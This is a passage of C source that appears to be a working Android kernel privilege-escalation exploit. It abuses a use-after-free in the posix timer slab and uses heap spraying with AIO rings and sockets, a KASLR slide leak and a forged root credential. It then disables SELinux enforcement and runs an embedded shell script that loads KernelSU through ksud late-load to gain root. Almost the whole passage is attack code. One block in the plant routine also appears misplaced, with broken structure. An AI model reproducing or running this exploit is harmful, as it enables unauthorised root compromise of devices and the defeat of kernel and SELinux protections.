		"echo 1 > /proc/sys/kernel/kptr_restrict 2>&1; echo \"write1 rc=$?\"\n"
		"echo 0 > /proc/sys/kernel/kptr_restrict 2>&1; echo \"write0 rc=$?\"\n"
		"echo \"[ksu] kptr=$(cat /proc/sys/kernel/kptr_restrict 2>&1)\"\n"
		"echo \"[ksu] kptr=$(cat /proc/sys/kernel/kptr_restrict 2>&1)\"\n"
		"echo \"[ksu] kallsyms: $(head -1 /proc/kallsyms 2>&1)\"\n"
		"PKG='%s'\n"
		"KSUD='%s'\n"
		"[ -x \"$KSUD\" ] || KSUD=/data/local/tmp/ksud\n"
		"if [ ! -x \"$KSUD\" ] && [ -n \"$PKG\" ]; then\n"
		"  a=$(pm path \"$PKG\" 2>/dev/null | head -1 | cut -d: -f2)\n"
		"  if [ -n \"$a\" ]; then "
		"KSUD=\"$(dirname \"$a\")/lib/arm64/libksud.so\"; fi\n"
		"fi\n"
		"if [ ! -x \"$KSUD\" ]; then\n"
		"  for p in me.weishu.kernelsu me.weishu.kernelsu.pr "
		"com.sukisu.ultra com.sukisu.ultra.pr com.resukisu.resukisu "
		"org.bakasu.bakasu com.rifsxd.ksunext "
		"com.kowx712.supermanager; do\n"
		"    a=$(pm path \"$p\" 2>/dev/null | head -1 | cut -d: -f2)\n"
		"    if [ -n \"$a\" ]; then\n"
		"      k=\"$(dirname \"$a\")/lib/arm64/libksud.so\"\n"
		"      if [ -x \"$k\" ]; then KSUD=\"$k\"; PKG=\"$p\"; break; fi\n"
		"    fi\n"
		"  done\n"
		"fi\n"
		"if [ ! -x \"$KSUD\" ]; then\n"
		"  KSUD=$(find /data/app -path "
		"'*/lib/arm64/libksud.so' 2>/dev/null | head -1)\n"
		"fi\n"
		/* SukiSU Ultra >= 4.3.0 ships the daemon as lib<10 lowercase>.so. */
		"if [ ! -x \"$KSUD\" ]; then\n"
		"  for k in $(find /data/app -path '*/lib/arm64/*.so' "
		"-size +1000k 2>/dev/null); do\n"
		"    if grep -aq 'late-load' \"$k\" 2>/dev/null; then "
		"KSUD=$k; break; fi\n"
		"  done\n"
		"fi\n"
		"if [ -z \"$PKG\" ] && [ -n \"$KSUD\" ]; then\n"
		"  case \"$KSUD\" in\n"
		"    /data/app/*/lib/*) "
		"PKG=$(basename \"$(dirname \"$(dirname \"$(dirname \"$KSUD\")\")\")\"); "
		"PKG=$(echo \"$PKG\" | cut -d- -f1) ;;\n"
		"  esac\n"
		"fi\n"
		"[ -x \"$KSUD\" ] || KSUD=/data/local/tmp/ksud\n"
		"[ -x \"$KSUD\" ] || KSUD=/data/local/tmp/libksud.so\n"
		"[ -x \"$KSUD\" ] || KSUD=/data/adb/ksu/bin/ksud\n"
		"if [ ! -x \"$KSUD\" ]; then echo '[ksu] ksud missing'; exit 1; fi\n"
		"echo \"[ksu] ksud=$KSUD pkg=$PKG "
		"version=$(\"$KSUD\" --version 2>&1 | head -1)\"\n"
		"if [ -n \"$PKG\" ]; then\n"
		"  \"$KSUD\" late-load --kmi android15-6.6 --allow-shell "
		"--package-name \"$PKG\"\n"
		"else\n"
		"  \"$KSUD\" late-load --kmi android15-6.6 --allow-shell\n"
		"fi\n"
		"echo \"[ksu] late-load rc=$?\"\n"
		"i=0\n"
		"while [ $i -lt 50 ]; do\n"
		"  grep -q '^kernelsu ' /proc/modules && break\n"
		"  i=$((i+1)); sleep 0.1\n"
		"done\n"
		"if grep -q '^kernelsu ' /proc/modules; then echo KSU_LOADED; "
		"else echo KSU_MISSING; fi\n"
		"echo 1 > /sys/fs/selinux/enforce 2>/dev/null\n"
		"echo \"[ksu] enforce=$(getenforce)\"\n";
	char pkg[128], ksud[512], buf[4096];
	int n, fd;

	compute_kmi();
	shell_escape(ksu_env("GHOSTLOCK_KSU_PKG"), pkg, sizeof(pkg));
	shell_escape(ksu_env("GHOSTLOCK_KSUD"), ksud, sizeof(ksud));
	n = snprintf(buf, sizeof(buf), fmt, pkg, ksud);

	fd = open("/data/local/tmp/ksu_stage.sh",
		      O_WRONLY | O_CREAT | O_TRUNC, 0755);
	if (fd < 0)
		return;
	if (n > 0 && (size_t)n < sizeof(buf))
		(void)!write(fd, buf, (size_t)n);
	close(fd);
	(void)chmod("/data/local/tmp/ksu_stage.sh", 0755);
	{
		FILE *pp = popen("pm path me.weishu.kernelsu 2>/dev/null | head -1",
				 "r");

		g_ksud_path[0] = 0;
		if (pp) {
			char line[512];

			if (fgets(line, sizeof(line), pp)) {
				char *p = strstr(line, "package:");
				char *slash;
				size_t l;

				if (p)
					p += 8;
				else
					p = line;
				l = strlen(p);
				while (l && (p[l - 1] == '\n' || p[l - 1] == '\r'))
					p[--l] = 0;
				slash = strrchr(p, '/');
				if (slash) {
					*slash = 0;
					snprintf(g_ksud_path, sizeof(g_ksud_path),
						 "%s/lib/arm64/libksud.so", p);
				}
			}
			pclose(pp);
		}
		logf("[+] ksud path=%s\n",
		     g_ksud_path[0] ? g_ksud_path : "(none)");
	}
}

static int read_panic_on_warn(void)
{
	FILE *f = fopen("/proc/sys/kernel/panic_on_warn", "r");
	int value = -1;

	if (f) {
		if (fscanf(f, "%d", &value) != 1)
			value = -1;
		fclose(f);
	}
	logf("[ksu] panic_on_warn=%d\n", value);
	return value;
}

static int stage_write(uint64_t target, int mode, const char *what,
		       struct plant_res *out)
{
	struct plant_res r;

	for (int attempt = 1; attempt <= 6; attempt++) {
		memset(&r, 0, sizeof(r));
		logf("[+] stage %s target=%#llx mode=%s attempt=%d\n", what,
		     (unsigned long long)target,
		     mode == MODE_FAKE ? "fake" : "zero", attempt);
		run_plant(target, 1, &r, 0, mode);
		if (r.ok) {
			if (out)
				*out = r;
			return 0;
		}
		if (!r.retry) {
			logf("[-] stage %s failed\n", what);
			return -1;
		}
	}
	logf("[-] stage %s exhausted retries\n", what);
	return -1;
}

static void park_forever(const char *why)
{
	logf("[!] %s -- parking without reap (zombie held)\n", why);
	logf("[!] reboot the device to clean up; do not kill this process\n");
	for (;;)
		pause();
}

/* Payload page: all zeros except the stale node's rb_left = S.
 *
 * The erased node is `p` (the stale timerqueue_node inside the freed
 * k_itimer). __rb_erase_augmented() reads:
 *     child = p->rb_right (0), tmp = p->rb_left (S), pc = p->__rb_parent_color
 * Since child == 0 it takes "still case 1, child is node->rb_left":
 *     tmp->__rb_parent_color = pc = 0;
 *     parent = __rb_parent(pc) = 0;
 *     __rb_change_child(p, S, 0, root)  -> root->rb_node = S
 * i.e. exactly one 8-byte zero write, at S. The offset of the node inside the
 * page must be computed from the slab base: an order-1 posix_timers_cache slab
 * holds 31 objects across two 4K halves and the victim may sit in either. */
/* Payload modes.
 *
 * MODE_ZERO:  __rb_parent_color = 0        -> rb_erase writes 0 to S.
 * MODE_PTR:   __rb_parent_color = A (self) -> RB_EMPTY_NODE() is true, so
 *             rb_next() returns NULL without dereferencing, and the erase
 *             writes pc (= A, the stale node's own kernel address) to S.
 * Both take the case-1-left path and perform one 8-byte write.
 */
static uint64_t g_slide;

/* selinux_state.builtin/... the LSM blob is opaque; only the first two
 * sids are written, exactly as the reference exploit does. */
struct cred_blob {
	uint32_t sid[16];
};

/* Pick a 0x40-byte window for the SELinux blob that does not overlap the
 * fake cred (cred is 0xb8 bytes at page_off). */
static size_t fake_blob_offset(size_t page_off)
{
	static const size_t cand[] = {0x1f00, 0x1000, 0x1800, 0x800, 0x100, 0x0};

	for (size_t i = 0; i < sizeof(cand) / sizeof(cand[0]); i++) {
		size_t b = cand[i];

		if (b + 0x40 > PAGE)
			continue;
		if (b + 0x40 <= page_off || page_off + sizeof(struct cred_blob) <= b)
			return b;
	}
	return (size_t)-1;
}

static void build_payload(unsigned char *buf, size_t page_off, uint64_t s_addr,
			  uint64_t node_addr, int mode)
{
	memset(buf, 0, SOCKBUF);
	/* rb_node: __rb_parent_color@0, rb_right@8, rb_left@16 */
	if (mode == MODE_PTR)
		*(uint64_t *)(buf + page_off + 0x00) = node_addr;
	*(uint64_t *)(buf + page_off + 0x10) = s_addr;
}

/* Fake cred laid out exactly like struct cred (BTF-verified offsets) and
 * planted over the stale node; task->cred then points at it. */
static void build_fake_cred(unsigned char *buf, size_t off, uint64_t parent,
			    uint64_t s_addr, uint64_t page, size_t blob)
{
	uint64_t *c = (uint64_t *)(buf + off);

	/* Zero the page first: cleanup_timerqueue() reads other k_itimer
	 * fields after the erase, and 0x0101... garbage makes it dereference
	 * wild pointers.  Only the blob window is filled with u32 1 so that
	 * osid/sid at cred->security + lbs_cred read as 1 (kernel). */
	memset(buf, 0, SOCKBUF);
	for (size_t fi = blob; fi + 4 <= SOCKBUF && fi < blob + 0x40; fi += 4)
		*(uint32_t *)(buf + fi) = 1;
	/* rb_node overlaid with the cred: rb_right@0x08 must be NULL so the
	 * erase takes the rb_left path, rb_left@0x10 = the slot to write. */
	*(uint64_t *)(buf + off + 0x00) = parent;
	*(uint64_t *)(buf + off + 0x08) = 0;
	*(uint64_t *)(buf + off + 0x10) = s_addr;
	c[3] = 0;				/* euid/egid */
	c[4] = 0;				/* fsuid/fsgid */
	c[5] = 0;				/* securebits */
	c[11] = 0;				/* anonymous union @0xa8 */
	for (int i = 6; i <= 10; i++)
		c[i] = FULLCAP;			/* inh/prm/eff/bset/amb */
	*(uint64_t *)(buf + off + 0x80) = page + blob;	/* security */
	*(uint64_t *)(buf + off + 0x88) = ROOT_USER_STATIC + g_slide;
	*(uint64_t *)(buf + off + 0x90) = INIT_USER_NS_STATIC + g_slide;
	*(uint64_t *)(buf + off + 0x98) = INIT_UCOUNTS_STATIC + g_slide;
	*(uint64_t *)(buf + off + 0xa0) = INIT_GROUPS_STATIC + g_slide;
	*(uint32_t *)(buf + blob + SELINUX_BLOB_OFF) = SELINUX_SID_KERNEL;
	*(uint32_t *)(buf + blob + SELINUX_BLOB_OFF + 4) = SELINUX_SID_KERNEL;
}

static int g_pool[SPRAY_SOCKS][2];
static int g_pool_n;
static _Atomic int g_burst, g_burst2, g_stop_spray;
static int g_xreuse;
static int g_xdone;
static int g_xpipe[2] = { -1, -1 };

struct spray_arg {
	unsigned char *payload;
	int sock_first, sock_count, cpu;
	_Atomic int tid;
};

static void ensure_pool(void)
{
	int snd = 16 << 20;

	if (g_pool_n)
		return;
	for (int i = 0; i < SPRAY_SOCKS; i++) {
		if (socketpair(AF_UNIX, SOCK_STREAM, 0, g_pool[i]))
			break;
		(void)setsockopt(g_pool[i][0], SOL_SOCKET, SO_SNDBUF, &snd,
				 sizeof(snd));
		(void)setsockopt(g_pool[i][1], SOL_SOCKET, SO_RCVBUF, &snd,
				 sizeof(snd));
		g_pool_n++;
	}
	if (!g_pool_n)
		park_forever("no spray sockets");
}

/* The three spray threads are the only tasks allowed to hand the freed slab
 * page to us: anything else that grabs it leaves a page we do not control, and
 * reaping against that would panic. */
static int tid_is_spray_tid(int tid, struct spray_arg *args)
{
	if (tid <= 0)
		return 0;
	for (int i = 0; i < SPRAY_THREADS; i++)
		if (atomic_load(&args[i].tid) == tid)
			return 1;
	return 0;
}

static void *spray_thread(void *x)
{
	struct spray_arg *a = x;
	int w = 0;

	atomic_store(&a->tid, (int)syscall(SYS_gettid));
	pin(a->cpu);
	while (!atomic_load(&g_burst))
		sched_yield();
	/* Phase 1 races the free; phase 2 is the burst released the instant the
	 * free is observed, so the next allocation is far more likely ours. */
	while (!atomic_load(&g_stop_spray) && w < SPRAY_PRE) {
		int k = a->sock_first + (w % a->sock_count);

		if (write(g_pool[k][0], a->payload, SOCKBUF) != SOCKBUF)
			break;
		w++;
	}
	while (!atomic_load(&g_burst2) && !atomic_load(&g_stop_spray))
		sched_yield();
	while (!atomic_load(&g_stop_spray) && w < SPRAY_PRE + SPRAY_POST) {
		int k = a->sock_first + (w % a->sock_count);

		if (write(g_pool[k][0], a->payload, SOCKBUF) != SOCKBUF)
			break;
		w++;
	}
	return NULL;
}

/* Self-test target: the reclaimed slab page itself. Once the freed order-1
 * page is handed to our socket it stays linearly mapped at the same VA, so
 * [slab_base] = 0 writes a zero into the first 8 bytes of *our own* payload
 * page. A clean return proves the payload landed and the erase really is a
 * single 8-byte zero write; it cannot damage any kernel object. */
static uint64_t self_test_target(uint64_t V) { return V & ~0x1fffULL; }

/* ---- AIO ring spray (docs/08 reclaim) ----
 * io_setup() gives us a user-mapped order-0 page. After the order-1 timer
 * slab is freed back to buddy and split, one of these ring pages can be the
 * half that holds the victim node; the payload is written straight into the
 * mapping. The trace's order-0 mm_page_alloc pfn tells us whether we got the
 * right half, so the plant never writes on a guess. */
#define AIO_MAX 256
static aio_context_t g_aio_ctx[AIO_MAX];
static _Atomic int g_aio_n, g_aio_tid;
static const unsigned char *g_aio_payload;
static size_t g_aio_off;
static int g_aio_vhalf;

static void *aio_thread(void *x)
{
	(void)x;
	pin(g_cpu);
	atomic_store(&g_aio_tid, (int)syscall(SYS_gettid));
	/* Wait for free_seen (the order-1 slab free) but do not wait forever:
	 * if the slab is not discarded the page never comes back, and a stuck
	 * AIO thread turns the plant into a timeout + wild write. */
	for (int spin = 0; spin < 4000000 && !atomic_load(&g_stop_spray) &&
			      !atomic_load(&g_burst2); spin++)
		sched_yield();
	if (atomic_load(&g_stop_spray))
		return NULL;
	{
		int n = 0;
		size_t po = g_aio_off & 0xfff;

		for (int i = 0; i < AIO_MAX; i++) {
			aio_context_t ctx = 0;

			if (syscall(__NR_io_setup, 1, &ctx) != 0)
				break;
			if (po + 0x40 <= 0x1000)
				memcpy((void *)((uintptr_t)ctx + po),
				       g_aio_payload + g_aio_off, 0x40);
			g_aio_ctx[n++] = ctx;
		}
		atomic_store(&g_aio_n, n);
	}
	return NULL;
}

static void run_plant(uint64_t target, int tag, struct plant_res *res,
		      int selftest, int mode)
{
	int ready_p[2], ack_p[2], tid_p[2];
	pid_t T;
	siginfo_t si;
	char ch;
	int etid = 0;
	long n;
	int cnt, nrec = 0, free_seen = 0, hit = 0, foreign = 0, slab_own = 0;
	uint64_t V = 0, site0 = 0, slab_pfn = 0, vslab;
	size_t off;
	unsigned char *payload;
	pthread_t th[SPRAY_THREADS];
	struct spray_arg args[SPRAY_THREADS];
	static timer_t padding[PADDING_TIMERS];
	int padding_n = 0;
	long t0, t1 = 0, t_free = 0, now_ms;
	int per;
	int aargs_cpu[SPRAY_THREADS];

	memset(res, 0, sizeof(*res));
	/* Fill the timer cache before forking the victim. */
	padding_n = create_slab_padding(padding, PADDING_TIMERS);
	logf("[+] plant%d slab padding=%d\n", tag, padding_n);
	if (pipe(ready_p) || pipe(ack_p) || pipe(tid_p)) {
		logf("[-] plant%d pipe failed\n", tag);
		delete_slab_padding(padding, padding_n);
		return;
	}
	T = fork();
	if (T < 0) {
		logf("[-] plant%d fork failed\n", tag);
		delete_slab_padding(padding, padding_n);
		return;
	}
	if (T == 0) {
		close(ready_p[0]);
		close(ack_p[1]);
		close(tid_p[0]);
		g_ready_w = ready_p[1];
		g_ack_r = ack_p[0];
		g_tid_w = tid_p[1];
		run_target();
		_exit(115);
	}
	close(ready_p[1]);
	close(ack_p[0]);
	close(tid_p[1]);

	if (read(ready_p[0], &ch, 1) != 1) {
		logf("[-] plant%d trigger never ready\n", tag);
		kill(T, SIGKILL);
		waitpid(T, NULL, 0);
		delete_slab_padding(padding, padding_n);
		return;
	}
	trace_start();
	if (write(ack_p[1], "A", 1) != 1)
		logf("[-] plant%d ack failed\n", tag);
	if (read(tid_p[0], &etid, sizeof(etid)) != sizeof(etid))
		logf("[-] plant%d exec tid not received\n", tag);

	if (wait_zombie(T, &si)) {
		logf("[-] plant%d no zombie; holding child\n", tag);
		trace_stop();
		g_held++;
		return;
	}
	logf("[+] plant%d target=%d etid=%d code=%d status=%d\n", tag, T, etid,
	     si.si_code, si.si_status);
	if (si.si_code != CLD_KILLED) {
		trace_stop();
		logf("[-] plant%d reap status not SIGKILL; holding zombie\n",
		     tag);
		g_held++;
		return;
	}

	cnt = harvest(g_evs, 400000);
	for (int i = 0; i < cnt; i++) {
		if (g_evs[i].type != EV_CACHE_ALLOC ||
		    g_evs[i].pid != etid)
			continue;
		if (g_evs[i].site != 0 &&
		    (g_evs[i].site & 0x1fffff) != TIMER_SITE_LOW21)
			continue;
		if (g_evs[i].req != TIMER_OBJ || g_evs[i].alloc != TIMER_OBJ)
			continue;
		if (nrec == 0)
			site0 = g_evs[i].site;
		if (nrec == VICTIM_IDX)
			V = g_evs[i].ptr;
		nrec++;
	}
	if (!V || !site0) {
		trace_stop();
		logf("[-] plant%d victim not captured (recs=%d); retryable\n",
		     tag, nrec);
		/* The victim is still an unreaped zombie (waitid used WNOWAIT),
		 * so it must never be reaped and must be accounted for, and the
		 * padding timers have to go before the next attempt re-fills
		 * the cache. */
		g_held++;
		delete_slab_padding(padding, padding_n);
		res->retry = 1;
		return;
	}
	slab_pfn = ((V - g_base) >> 12) & ~1ULL;
	vslab = V & ~0x1fffULL;
	/* site0 is the do_timer_create call site that allocated this timer;
	 * its runtime address minus the link-time address is the KASLR slide. */
	if (g_slide_lock)
		g_slide = g_slide_lock;
	else
		g_slide = site0 - STATIC_TIMER_SITE;
	for (int i = 0; i < cnt; i++)
		if (g_evs[i].type == EV_CACHE_ALLOC &&
		    g_evs[i].pid == etid &&
		    g_evs[i].req == TIMER_OBJ &&
		    g_evs[i].alloc == TIMER_OBJ &&
		    (g_evs[i].ptr & ~0x1fffULL) == vslab)
			slab_own++;
	logf("[+] plant%d V=%#llx A=%#llx slab_pfn=%#llx half=%d recs=%d slab_own=%d/31 slide=%#llx\n",
	     tag, (unsigned long long)V,
	     (unsigned long long)(V + ITIMER_NODE),
	     (unsigned long long)slab_pfn, (int)((V >> 12) & 1), nrec,
	     slab_own, (unsigned long long)g_slide);
	if (slab_own != 31) {
		/* A wrong V points the payload at an arbitrary slab offset; the
		 * pid check would still pass and the erase would land
		 * uncontrolled. Refuse to continue. */
		trace_stop();
		logf("[-] plant%d slab_own=%d != 31 (lost records); retryable\n",
		     tag, slab_own);
		g_held++;
		delete_slab_padding(padding, padding_n);
		res->retry = 1;
		return;
	}

	if (selftest) {
		uint64_t alias = self_test_target(V);

		logf("[+] plant%d SELFTEST target=A_alias=%#llx (was %#llx)\n",
		     tag, (unsigned long long)alias,
		     (unsigned long long)target);
		target = alias;
	}
	off = (size_t)((V & 0x1fff) + ITIMER_NODE);
	payload = malloc(SOCKBUF);
	if (!payload)
		park_forever("payload alloc failed");
	/* A is the stale node's kernel address: kernel VA, not the user alias. */
	if (mode == MODE_FAKE || mode == MODE_BLOB) {
		size_t blob = fake_blob_offset(off);

		if (blob == (size_t)-1) {
			logf("[-] plant%d fake cred spills off=%#zx; retryable\n",
			     tag, off);
			if (g_xreuse) {
		logf("[xreuse] loop hit=%d foreign=%d free_seen=%d", hit, foreign, free_seen);
		res->ok = hit;
		return;
	}
	atomic_store(&g_stop_spray, 1);
			kill(T, SIGKILL);
			waitpid(T, NULL, 0);
			delete_slab_padding(padding, padding_n);
			free(payload);
			res->retry = 1;
			return;
		}
		if (mode == MODE_BLOB) {
			/* Zero fill keeps the k_itimer cleanup path safe; only the
			 * 0x40-byte blob window carries u32 1 sids. */
			memset(payload, 0, SOCKBUF);
			for (size_t fi = blob;
			     fi + 4 <= SOCKBUF && fi < blob + 0x40; fi += 4)
				*(uint32_t *)(payload + fi) = 1;
			*(uint64_t *)(payload + off + 0x00) =
				(V & ~0x1fffULL) + blob;
			*(uint64_t *)(payload + off + 0x08) = 0;
			*(uint64_t *)(payload + off + 0x10) = target;
			logf("[+] plant%d blob payload off=%#zx blob=%#zx sec=%#llx\n",
			     tag, off, blob,
			     (unsigned long long)((V & ~0x1fffULL) + blob));
		} else {
			build_fake_cred(payload, off, V + ITIMER_NODE, target,
					V & ~0x1fffULL, blob);
			logf("[+] plant%d fake cred off=%#zx blob=%#zx sec=%#llx\n",
			     tag, off, blob,
			     (unsigned long long)((V & ~0x1fffULL) + blob));
		}
	} else {
		build_payload(payload, off, target, V + ITIMER_NODE, mode);
	}
	logf("[+] plant%d A_page_off=%#zx rb_left_slot=%#llx\n", tag, off,
	     (unsigned long long)target);

	g_aio_payload = payload;
	g_aio_off = off;
	g_aio_vhalf = (V & 0x1000) ? 1 : 0;
	atomic_store(&g_aio_n, 0);
	atomic_store(&g_aio_tid, 0);
	{
		pthread_t ath;

		if (!pthread_create(&ath, NULL, aio_thread, NULL))
			pthread_detach(ath);
	}

	/* AIO-only reclaim: the socket spray is disabled (g_pool_n stays 0,
	 * so the sprayers get sock_count 0 and never race for the page). The
	 * order-0 AIO ring pages are the only reclaim channel now. */
	ensure_raw();
	atomic_store(&g_burst, 0);
	atomic_store(&g_stop_spray, 0);

	/* Create the sprayers before dropping the padding: they block on
	 * g_burst, so the first write after the release already races for the
	 * page instead of starting up during it. */
	per = g_pool_n / SPRAY_THREADS;
	for (int i = 0; i < SPRAY_THREADS; i++) {
		args[i].payload = payload;
		args[i].sock_first = i * per;
		args[i].sock_count = per;
		args[i].cpu = i;
		atomic_store(&args[i].tid, 0);
	}
	for (int i = 0; i < SPRAY_THREADS; i++)
		if (args[i].sock_count > 0 &&
		    pthread_create(&th[i], NULL, spray_thread, &args[i]))
			args[i].sock_count = 0;
	for (int i = 0; i < SPRAY_THREADS; i++)
		for (int spin = 0; spin < 100000 && args[i].sock_count &&
				  !atomic_load(&args[i].tid); spin++)
			sched_yield();

	/* Empty the cache: the victim slab is now the only one that can be
	 * released, so the page really goes back to buddy. */
	trace_stop();
	delete_slab_padding(padding, padding_n);
	{
		int sa, st;

		slab_timers(&sa, &st);
		logf("[+] plant%d padding dropped, releasing the burst "
		     "(posix_timers_cache %d/%d)\n", tag, sa, st);
	}
	trace_start();

	/* Phase 1 starts now; phase 2 is released the moment the free is seen,
	 * so the allocation never gets a head start on us. */
	if (!g_xreuse)
		atomic_store(&g_burst, 1);
	{
		struct timespec ts;

		clock_gettime(CLOCK_MONOTONIC, &ts);
		t0 = ts.tv_sec * 1000L + ts.tv_nsec / 1000000L;
	}
	for (;;) {
		struct timespec ts;

		for (int c = 0; c < 8 && !hit && !foreign; c++) {
			long m = read_cpu(c, g_raw, g_raw_cap);
			int k = m > 0 ? parse_events(g_raw, (size_t)m, g_evs,
						     400000)
				      : 0;

			for (int j = 0; j < k; j++) {
				if (g_evs[j].type == EV_PAGE_ALLOC &&
				    g_evs[j].order == 1 &&
				    g_evs[j].pfn == slab_pfn) {
					if (g_xreuse && g_evs[j].pid == getpid()) {
						logf("[xreuse] SELF page_alloc pfn=%#llx", (unsigned long long)slab_pfn);
						hit = 1;
					} else if (tid_is_spray_tid(g_evs[j].pid, args))
						hit = 1;
					else
						foreign = 1;
				}
				/* AIO ring page: order-0, the half holding V. */
				if (g_evs[j].type == EV_PAGE_ALLOC &&
				    g_evs[j].order == 0 &&
				    g_evs[j].pfn == slab_pfn +
							   (uint64_t)g_aio_vhalf &&
				    g_evs[j].pid == atomic_load(&g_aio_tid)) {
					logf("[+] plant%d AIO hit pfn=%#llx half=%d\n",
					     tag,
					     (unsigned long long)g_evs[j].pfn,
					     g_aio_vhalf);
					hit = 1;
				}
				if (!free_seen &&
				    (g_evs[j].type == EV_PAGE_FREE ||
				     g_evs[j].type == EV_PCPU_DRAIN) &&
				    g_evs[j].order == 1 &&
				    (g_evs[j].pfn == slab_pfn ||
				     g_evs[j].pfn == slab_pfn + 1)) {
					free_seen = 1;
					if (g_xreuse && !g_xdone) {
						int made = 0;

						g_xdone = 1;
						for (int pi = 0; pi < 256; pi++) {
							int q[2];

							if (pipe(q) != 0)
								break;
							if (fcntl(q[0], F_SETPIPE_SZ, 128 * 4096) < 0) {
								close(q[0]);
								close(q[1]);
								break;
							}
							made++;
						}
						logf("[xreuse] pipes=%d errno=%d", made, errno);
					}
					atomic_store(&g_burst2, 1);
					clock_gettime(CLOCK_MONOTONIC, &ts);
					t_free = ts.tv_sec * 1000L +
						 ts.tv_nsec / 1000000L;
				}
			}
		}
		clock_gettime(CLOCK_MONOTONIC, &ts);
		/* Keep scanning for 200ms after the free: a foreign alloc record
		 * may not have landed in the drained buffer yet, and treating it
		 * as a pure miss makes the retry start from an unpredictable
		 * slot. */
		now_ms = ts.tv_sec * 1000L + ts.tv_nsec / 1000000L;
		if (hit || foreign ||
		    (free_seen && now_ms - t_free > (g_xreuse ? 5000 : 200)) ||
		    now_ms - t0 > 15000)
			break;
		usleep(50);
	}
	if (g_xreuse) {
		logf("[xreuse] loop hit=%d foreign=%d free_seen=%d", hit, foreign, free_seen);
		res->ok = hit;
		return;
	}
	atomic_store(&g_stop_spray, 1);
	atomic_store(&g_burst2, 1);
	for (int i = 0; i < SPRAY_THREADS; i++)
		if (args[i].sock_count)
			pthread_join(th[i], NULL);
	trace_stop();
	if (!hit && !foreign) {
		/* Nothing claimed the page and we did not win it: the stale node
		 * is intact, so a fresh attempt is safe. */
		logf("[-] plant%d burst missed (free_seen=%d); retryable\n", tag,
		     free_seen);
		g_held++;
		delete_slab_padding(padding, padding_n);
		free(payload);
		res->retry = 1;
		return;
	}
	logf("[+] plant%d burst hit=%d foreign=%d free_seen=%d\n", tag, hit,
	     foreign, free_seen);
	if (!hit) {
		logf("[-] plant%d %s; holding zombie\n", tag,
		     foreign ? "page was taken by another allocation"
			     : "burst missed");
		free(payload);
		g_held++;
		delete_slab_padding(padding, padding_n);
		/* A pure burst miss means the freed page was never claimed by
		 * anyone, so the stale node is still allocated and stale. The
		 * caller may retry with a fresh victim; only a foreign claim
		 * makes the slot unpredictable. */
		if (!foreign)
			res->retry = 1;
		return;
	}

	usleep(1000);
	{
		int st = 0;

		waitpid(T, &st, 0);
		logf("[+] plant%d reaped status=%#x\n", tag, st);
	}
	res->V = V;
	res->A = V + ITIMER_NODE;
	res->slab_pfn = slab_pfn;
	res->ok = 1;
	free(payload);
}

static int run_daemon_stage(void)
{
	char *const av[] = { (char *)SU_PATH, (char *)"--daemon", NULL };
	char *const ep[] = { (char *)"PATH=/system/bin:/system/xbin", NULL };

	return (int)execve(SU_PATH, av, ep);
}

static void child_mark(const char *s)
{
	int fd = open("/data/local/tmp/cm2.txt",
		      O_WRONLY | O_CREAT | O_APPEND, 0644);

	if (fd >= 0) {
		(void)write(fd, s, strlen(s));
		(void)write(fd, "\n", 1);
		close(fd);
	}
}

static void every_n_ms(long *t0, int every, char *buf, size_t cap, int of);

static int wait_child_main(int shell_mode)
{
	struct child_report rep;
	char ch;
	int hello = CHILD_HELLO;

	pin(g_cpu);
	child_mark("start");
	if (write(4, &hello, sizeof(hello)) != sizeof(hello)) {
		logf("[child] hello write failed errno=%d\n", errno);
		_exit(130);
	}
	child_mark("hello-sent");
	(void)write(2, "PRE\n", 4);
	child_mark("pre-read");
	if (read(3, &ch, 1) != 1) {
		(void)write(2, "RDFAIL\n", 7);
		logf("[child] wake read failed errno=%d\n", errno);
		_exit(131);
	}
	child_mark("post-read");
	/* own70 diagnostic: fork a kmsg reader while the fake cred is effective.
	 * The reader inherits a real cred derived from the fake one (full caps,
	 * sid 1), so it can open /dev/kmsg; it appends every record to disk. */
	if (shell_mode == 4) { /* own71: always capture kmsg in fake mode (env is lost across the child execve) */
		pid_t kc = fork();

		if (kc == 0) {
			int kf, of;
			char kb[8192], hdr[160], hb2[64];
			int hn, rn2;
			long t0 = (long)time(NULL);

			kf = open("/dev/kmsg", O_RDONLY | O_NONBLOCK | O_CLOEXEC);
			if (kf < 0)
				kf = open("/proc/kmsg", O_RDONLY | O_NONBLOCK | O_CLOEXEC);
			rn2 = errno;
			of = open("/data/local/tmp/kmsg_capture.txt",
				  O_WRONLY | O_CREAT | O_TRUNC, 0644);
			if (of >= 0) {
				hn = snprintf(hdr, sizeof(hdr),
					      "# kmsg capture kf=%d errno=%d pid=%d\n",
					      kf, rn2, (int)getpid());
				if (hn > 0) (void)!write(of, hdr, (size_t)hn);
				(void)fsync(of);
				for (;;) {
					ssize_t n = kf >= 0 ? read(kf, kb, sizeof(kb)) : -1;

					if (n > 0) {
						(void)!write(of, kb, (size_t)n);
						(void)fsync(of);
					} else if (kf < 0) {
						kf = open("/dev/kmsg",
							  O_RDONLY | O_NONBLOCK | O_CLOEXEC);
					}
					every_n_ms(&t0, 200, hb2, sizeof(hb2), of);
					usleep(300);
				}
			}
			_exit(0);
		}
	}
	/* own72: stay here until the parent has finished the uid repair.
	 * own127 nofix: the repair plant is skipped, so the child proceeds on
	 * its own (the parent's second wake byte is not needed). */
	if (g_child_nofix) {
		logf("[child] nofix: not waiting for the second gate byte\n");
	} else {
		char ch2;

		if (read(3, &ch2, 1) != 1) {
			logf("[child] second gate failed errno=%d\n", errno);
			_exit(133);
		}
	}
	close(3);
	{
		/* First post-fake-cred action: ask selinuxfs to go permissive
		 * ourselves, instead of corrupting selinux_state via the UAF
		 * (which broke system_server on this build). */
		int efd = open("/sys/fs/selinux/enforce",
			       O_WRONLY | O_CLOEXEC);

		if (efd >= 0) {
			(void)write(efd, "0", 1);
			close(efd);
		}
	}
	(void)write(2, "WAKE\n", 5);
	child_mark("woke");

	memset(&rep, 0, sizeof(rep));
	rep.magic = CHILD_MAGIC;
	rep.uid = (int)syscall(SYS_getuid);
	rep.euid = (int)syscall(SYS_geteuid);
	logf("[child] woke uid=%d euid=%d pid=%d tgid=%d\n", rep.uid,
	     rep.euid, (int)syscall(SYS_getpid), (int)syscall(SYS_gettid));
	if (shell_mode == 4) {
		child_mark("fake-path");
		/* Fake cred: euid is 0 and all capabilities are present, but uid
		 * may still be non-zero. Hand off to ksud late-load exactly like
		 * the reference exploit. */
		char *const envp[] = {
			(char *)"PATH=/system/bin:/system/xbin:/sbin:/vendor/bin",
			(char *)"HOME=/", (char *)"TMPDIR=/data/local/tmp",
			(char *)"ANDROID_DATA=/data", (char *)"ANDROID_ROOT=/system",
			NULL
		};
